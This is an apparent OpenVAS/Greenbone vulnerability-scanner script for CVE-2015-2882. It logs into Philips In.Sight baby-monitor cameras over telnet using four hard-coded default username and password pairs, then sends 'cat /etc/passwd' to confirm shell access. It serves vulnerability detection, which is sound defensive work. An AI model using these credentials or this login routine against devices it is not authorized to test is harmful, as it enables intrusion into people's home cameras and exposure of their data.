# SPDX-FileCopyrightText: 2016 SCHUTZWERK GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.111096");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2016-04-24 12:00:00 +0200 (Sun, 24 Apr 2016)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2017-04-14 14:16:00 +0000 (Fri, 14 Apr 2017)");

  script_cve_id("CVE-2015-2882");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Philips In.Sight Default Credentials (Telnet)");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2016 SCHUTZWERK GmbH");
  script_family("Default Accounts");
  script_dependencies("telnetserver_detect_type_nd_version.nasl", "gb_default_credentials_options.nasl");
  script_require_ports("Services/telnet", 23);
  script_mandatory_keys("telnet/philips/in_sight/detected");
  script_exclude_keys("default_credentials/disable_default_account_checks");

  script_tag(name:"summary", value:"The remote Philips In.Sight Device has default credentials
  set.");

  script_tag(name:"vuldetect", value:"Connect to the telnet service and try to login with default
  credentials.");

  script_tag(name:"impact", value:"This issue may be exploited by a remote attacker to gain access
  to sensitive information or modify system configuration.");

  script_tag(name:"insight", value:"It was possible to login with default credentials of
  root:b120root, root:insightr, admin:/ADMIN/ or mg3500:merlin");

  script_tag(name:"solution", value:"The vendor has released an updated firmware disabling the
  telnet access.");

  script_xref(name:"URL", value:"http://www.ifc0nfig.com/a-close-look-at-the-philips-in-sight-ip-camera-range/");
  script_xref(name:"URL", value:"https://www.rapid7.com/docs/Hacking-IoT-A-Case-Study-on-Baby-Monitor-Exposures-and-Vulnerabilities.pdf");

  exit(0);
}

if( get_kb_item( "default_credentials/disable_default_account_checks" ) )
  exit( 0 );

include("dump.inc");
include("host_details.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");
include("port_service_func.inc");
include("telnet_func.inc");

report = 'It was possible to login using the following credentials:\n';

port = telnet_get_port( default:23 );

banner = telnet_get_banner( port:port );
if( !banner || "insight login" >!< banner )
  exit(0);

creds = make_array( "root", "b120root",
                    "rooT", "insightr",
                    "admin", "/ADMIN/",
                    "mg3500", "merlin" );

foreach cred ( keys( creds ) ) {

  soc = open_sock_tcp( port );
  if( ! soc )
    exit( 0 );

  recv = recv( socket:soc, length:2048 );

  if ( "insight login" >< recv ) {

    send( socket:soc, data: tolower( cred ) + '\r\n' );
    recv = recv( socket:soc, length:128 );

    if( "Password:" >< recv ) {
      send( socket:soc, data: creds[cred] + '\r\n\r\n' );
      recv = recv( socket:soc, length:1024 );

      files = traversal_files("linux");

      foreach pattern( keys( files ) ) {

        file = files[pattern];

        send( socket:soc, data: 'cat /etc/passwd\r\n' );
        recv = recv( socket:soc, length:1024 );

        if( egrep( string:recv, pattern:pattern ) ) {
          report += '\n' + tolower( cred ) + ":" + creds[cred];
          VULN = TRUE;
          break;
        }
      }
    }
  }
  close( soc );
}

if( VULN ) {
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
